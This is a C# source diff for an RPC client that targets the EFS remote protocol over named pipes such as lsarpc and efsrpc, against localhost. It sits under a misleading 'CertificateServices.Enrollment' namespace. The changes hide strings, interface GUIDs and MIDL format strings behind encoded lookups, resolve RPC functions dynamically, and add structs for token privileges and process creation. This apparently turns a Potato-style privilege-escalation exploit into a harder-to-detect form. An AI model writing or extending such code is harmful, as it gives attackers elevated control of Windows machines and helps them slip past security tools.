-        private static byte[] MIDL_ProcFormatStringx64 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x09, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41, 0x59, 0x41, 0x73, 0x41, 0x41, 0x41, 0x41, 0x41, 0x49, 0x41, 0x07, 0x43, 0x4b, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x4a, 0x40, 0x49, 0x41, 0x4d, 0x41, 0x31, 0x41, 0x51, 0x41, 0x49, 0x41 });
-        private static byte[] MIDL_TypeFormatStringx86 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x41, 0x50, 0x45, 0x43, 0x41, 0x71, 0xe1, 0x41, 0x41, 0x50, 0x49, 0x64, 0x1d, 0x41, 0x41 });
-        private static byte[] MIDL_TypeFormatStringx64 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x41, 0x50, 0x45, 0x43, 0x41, 0x71, 0xe1, 0x41, 0x41, 0x50, 0x49, 0x64, 0x1d, 0x41, 0x41 });
-
         Guid interfaceId;
         public RpcServiceClient(string pipe)
         {
-            string g1 = "c681d488-d850-11d0-" + "8c52-00c04fd90f7e";
-            string g2 = "df1941c5-fe89-4e79-" + "bf10-463657acf44d";
+            string g1 = X.S(X._g1);
+            string g2 = X.S(X._g2);
             IDictionary<string, string> endpointMap = new Dictionary<string, string>()
             {
-                {"lsarpc", g1},
-                {"efsrpc", g2},
-                {"samr", g1},
-                {"lsass", g1},
-                {"netlogon", g1}
+                {X.S(X._ep1), g1},
+                {X.S(X._ep2), g2},
+                {X.S(X._ep3), g1},
+                {X.S(X._ep4), g1},
+                {X.S(X._ep5), g1}
             };
             interfaceId = new Guid(endpointMap[pipe]);
             pipe = String.Format("\\pipe\\{0}", pipe);
             if (IntPtr.Size == 8)
-                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
+                InitializeStub(interfaceId, X.D(X._mps64), X.D(X._mts64), pipe, 1, 0);
             else
-                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
+                InitializeStub(interfaceId, X.D(X._mps86), X.D(X._mts86), pipe, 1, 0);
         }
 
         ~RpcServiceClient()
@@ -412,9 +511,9 @@ namespace CertificateServices.Enrollment
             try
             {
                 if (IntPtr.Size == 8)
-                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
+                    result = X.pfNdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni(X.S(X._lh))), FileName);
                 else
-                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
+                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni(X.S(X._lh))), pfn);
             }
             catch (SEHException)
             {
@@ -481,13 +580,13 @@ namespace CertificateServices.Enrollment
             IntPtr bindingstring = IntPtr.Zero;
             IntPtr binding = IntPtr.Zero;
             Int32 status;
-            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
+            status = X.pfRpcStringBindingCompose(interfaceId.ToString(), X.S(X._ncnp), server, PipeName, null, out bindingstring);
             if (status != 0) return IntPtr.Zero;
-            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
-            RpcBindingFree(ref bindingstring);
+            status = X.pfRpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
+            X.pfRpcBindingFree(ref bindingstring);
             if (status != 0) return IntPtr.Zero;
-            RpcBindingSetAuthInfo(binding, server, 6, 9, IntPtr.Zero, 16);
-            RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
+            X.pfRpcBindingSetAuthInfo(binding, server, 6, 9, IntPtr.Zero, 16);
+            X.pfRpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
             return binding;
         }
 
@@ -497,15 +596,71 @@ namespace CertificateServices.Enrollment
         {
             GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
             IntPtr result;
-            try { result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject()); }
+            try { result = X.pfNdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject()); }
             finally { stackhandle.Free(); }
             return result;
         }
     }
 
+    #region structs
+    [StructLayout(LayoutKind.Sequential)]
+    struct TOKEN_PRIVILEGES
+    {
+        public uint PrivilegeCount;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+        public LUID_AND_ATTRIBUTES[] Privileges;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    struct LUID_AND_ATTRIBUTES
+    {
+        public LUID Luid;
+        public UInt32 Attributes;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    struct LUID
+    {
+        public uint LowPart;
+        public int HighPart;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFO
+    {
+        public Int32 cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    struct SECURITY_ATTRIBUTES
+    {
+        public int nLength;
+        public IntPtr pSecurityDescriptor;
+        public int bInheritHandle;
+    }
     [StructLayout(LayoutKind.Sequential)]
     struct COMM_FAULT_OFFSETS { public short CommOffset; public short FaultOffset; }
-
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_VERSION
     {
@@ -513,10 +668,8 @@ namespace CertificateServices.Enrollment
         public ushort MinorVersion;
         public RPC_VERSION(ushort maj, ushort min) { MajorVersion = maj; MinorVersion = min; }
     }
-
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_SYNTAX_IDENTIFIER { public Guid SyntaxGUID; public RPC_VERSION SyntaxVersion; }
-
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_CLIENT_INTERFACE
     {
@@ -541,7 +694,6 @@ namespace CertificateServices.Enrollment
             Reserved = IntPtr.Zero; InterpreterInfo = IntPtr.Zero; Flags = 0u;
         }
     }
-
     [StructLayout(LayoutKind.Sequential)]
     struct MIDL_STUB_DESC
     {
@@ -576,4 +728,5 @@ namespace CertificateServices.Enrollment
             mFlags = new IntPtr(0x00000001); CsRoutineTables = IntPtr.Zero; ProxyServerInfo = IntPtr.Zero; pExprInfo = IntPtr.Zero;
         }
     }
+    #endregion
 }
